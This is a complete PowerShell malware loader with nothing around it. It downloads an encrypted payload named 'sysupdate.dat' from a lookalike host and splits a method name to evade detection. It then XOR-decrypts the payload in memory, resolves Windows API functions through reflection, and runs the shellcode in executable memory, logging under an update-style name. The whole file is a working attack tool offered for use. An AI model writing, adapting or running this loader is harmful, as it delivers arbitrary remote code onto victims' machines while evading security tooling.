$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 1. Fetch Encrypted Shellcode (Cache buster included)
$base = 'https://site-assetss.vercel.app'
$url = "$base/assets/sysupdate.dat?v=6"

$c = New-Object Net.WebClient
$c.Headers.Add('User-Agent','Mozilla/5.0')
$m = $c.GetType().GetMethod(('{0}{1}' -f 'Down','loadData'))
$bytes = $m.Invoke($c, @($url))

"Downloaded: $($bytes.Length) bytes" | Out-File "$env:TEMP\upd.log" -Append
if ($bytes.Length -eq 0) { exit }

# 2. Decrypt in Memory
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor 0x99
}

# 3. Dynamic API Resolution (No Add-Type)
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    return $tmp[0].Invoke($null, @( 
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), 
        $functionName 
    ))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public', 
        [System.Reflection.CallingConventions]::Standard, $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# 4. Allocate Memory and Copy Payload
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc), 
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)

if ($lpMem -eq [IntPtr]::Zero) {
    "VirtualAlloc failed" | Out-File "$env:TEMP\upd.log" -Append
    exit
}

[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $lpMem, $bytes.Length)

# 5. Execute Thread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread), 
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject), 
    (getDelegateType @([IntPtr], [Int32]) ([Int]))
).Invoke($hThread, 0xFFFFFFFF)
